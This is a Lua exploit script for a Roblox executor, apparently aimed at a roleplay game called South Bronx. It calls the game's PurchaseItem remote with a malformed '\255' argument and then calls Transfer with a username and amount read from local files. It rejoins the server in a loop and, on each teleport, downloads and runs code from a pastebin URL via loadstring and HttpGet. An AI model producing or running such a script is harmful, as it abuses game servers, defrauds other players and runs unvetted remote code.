local cloneref = cloneref or function(...) return ... end

queue_on_teleport("loadstring(game:HttpGet('https://pastebin.com/raw/NxcZfG6u'))()")
local username = readfile('SouthBronxUsernameRealGame.txt')

repeat wait() until game:IsLoaded()

repeat task.wait() until cloneref(game:GetService("Players")).LocalPlayer
repeat task.wait() until cloneref(game:GetService("Players")).LocalPlayer:FindFirstChild("PlayerGui")
repeat task.wait() until cloneref(game:GetService("Players")).LocalPlayer:FindFirstChild("PlayerGui"):FindFirstChild("NOTE", true)
repeat task.wait() until cloneref(game:GetService("Players")).LocalPlayer:FindFirstChild("PlayerGui"):FindFirstChild("NOTE", true).Text == "NOTE: THIS IS A SERIOUS ROLEPLAYING GAME."

local ohString1 = 'Shoes'
local ohString2 = 'YZ Slides'
local ohString3 = '\255'

cloneref(game:GetService('ReplicatedStorage')).RemoteEvents.PurchaseItem:FireServer(ohString1, ohString2, ohString3)

task.wait(2)

local args = {
    [1] = tostring(username),
    [2] = tonumber(readfile('SouthBronxAmountRealGame.txt'))
}

cloneref(game:GetService("ReplicatedStorage")):WaitForChild("RemoteEvents"):WaitForChild("Transfer"):FireServer(unpack(args))

task.wait(1.5)

cloneref(game:GetService("TeleportService")):TeleportToPlaceInstance(game.PlaceId, game.JobId)